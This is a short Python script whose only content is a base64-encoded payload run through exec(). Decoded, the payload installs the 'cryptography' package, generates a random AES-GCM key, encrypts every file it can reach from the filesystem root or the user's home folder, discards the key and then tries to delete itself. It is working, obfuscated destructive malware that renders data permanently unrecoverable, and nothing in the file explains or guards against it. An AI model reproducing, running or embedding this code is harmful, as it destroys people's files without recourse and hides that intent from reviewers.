import base64
b64_code = "aW1wb3J0IHN1YnByb2Nlc3MsIHBsYXRmb3JtLCBvcywgc3lzCmZyb20gcGF0aGxpYiBpbXBvcnQgUGF0aAoKdHJ5OgogICAgX19pbXBvcnRfXygiY3J5cHRvZ3JhcGh5IikKZXhjZXB0IEltcG9ydEVycm9yOgogICAgc3VicHJvY2Vzcy5jaGVja19jYWxsKFtzeXMuZXhlY3V0YWJsZSwgIi1tIiwgInBpcCIsICJpbnN0YWxsIiwgImNyeXB0b2dyYXBoeSJdKQpmaW5hbGx5OgogICAgZ2xvYmFscygpWyJjcnlwdG9ncmFwaHkiXSA9IF9faW1wb3J0X18oImNyeXB0b2dyYXBoeSIpCgpmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLmFlYWQgaW1wb3J0IEFFU0dDTQoKZGVmIGVuY3J5cHRfZmlsZShmaWxlcGF0aDogUGF0aCwga2V5OiBieXRlcyk6CiAgICB0cnk6CiAgICAgICAgZGF0YSA9IGZpbGVwYXRoLnJlYWRfYnl0ZXMoKQogICAgICAgIG5vbmNlID0gb3MudXJhbmRvbSgxMikKICAgICAgICBhZXNnY20gPSBBRVNHQ00oa2V5KQogICAgICAgIGVuY3J5cHRlZCA9IGFlc2djbS5lbmNyeXB0KG5vbmNlLCBkYXRhLCBOb25lKQogICAgICAgIGZpbGVwYXRoLndyaXRlX2J5dGVzKG5vbmNlICsgZW5jcnlwdGVkKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmRlZiByZWN1cnNpdmVfZW5jcnlwdChyb290X3BhdGgsIGtleSk6CiAgICByb290ID0gUGF0aChyb290X3BhdGgpCiAgICBpZiBub3Qgcm9vdC5leGlzdHMoKSBvciBub3Qgcm9vdC5pc19kaXIoKToKICAgICAgICBzeXMuZXhpdCgxKQogICAgZm9yIHBhdGggaW4gcm9vdC5yZ2xvYigiKiIpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgcGF0aC5pc19maWxlKCk6CiAgICAgICAgICAgICAgICBlbmNyeXB0X2ZpbGUocGF0aCwga2V5KQogICAgICAgIGV4Y2VwdCBQZXJtaXNzaW9uRXJyb3I6CiAgICAgICAgICAgIHBhc3MKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHBhc3MKCmRlZiBnZXRfcm9vdF9wYXRoKCk6CiAgICBzeXN0ZW0gPSBwbGF0Zm9ybS5zeXN0ZW0oKQogICAgaWYgc3lzdGVtIGluIFsiTGludXgiLCAiRGFyd2luIl06CiAgICAgICAgcmV0dXJuIFBhdGgoIi8iKQogICAgZWxpZiBzeXN0ZW0gPT0gIldpbmRvd3MiOgogICAgICAgIHJldHVybiBQYXRoLmhvbWUoKQogICAgZWxzZToKICAgICAgICBzeXMuZXhpdCgxKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGtleV9ieXRlcyA9IG9zLnVyYW5kb20oMzIpCiAgICByb290ID0gZ2V0X3Jvb3RfcGF0aCgpCiAgICByZWN1cnNpdmVfZW5jcnlwdChyb290LCBrZXlfYnl0ZXMpCiAgICB0cnk6CiAgICAgICAgb3MucmVtb3ZlKCIxLnB5IikKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgo="
decoded = base64.b64decode(b64_code).decode('utf-8')
exec(decoded)
